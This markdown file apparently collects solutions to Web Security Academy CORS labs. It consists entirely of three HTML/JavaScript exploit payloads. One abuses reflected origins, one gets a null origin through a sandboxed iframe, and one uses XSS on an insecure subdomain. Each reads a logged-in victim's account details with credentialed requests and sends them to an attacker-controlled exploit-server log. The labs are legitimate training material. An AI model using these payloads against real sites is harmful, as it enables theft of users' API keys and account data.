# CORS reflect origin, Allow Credentials : true
```html
<html>

    <body>

        <script>
        const req = new XMLHttpRequest();
        req.onload = function() { 
            fetch('/log?key=' + req.responseText)
            }
        req.open('GET', 'https://0a3400cf04cf185f8276e2d900e100c6.web-security-academy.net/accountDetails')
        req.withCredentials = true
        req.send();
        </script>

    </body>

</html>
```


# Origin null
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a4f007f0416b4c683529c9400a20079.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0aaf0040046ab41283989b6c018b00a2.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```


# CORS vulnerability with trusted insecure protocols
```html
<html>

    <body>

    <script>
        document.location="http://stock.0a1f0019043635e08188bd6200fb0082.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1f0019043635e08188bd6200fb0082.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a88005a046b356181d2bcf7012100f1.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>

    </body>

</html>
```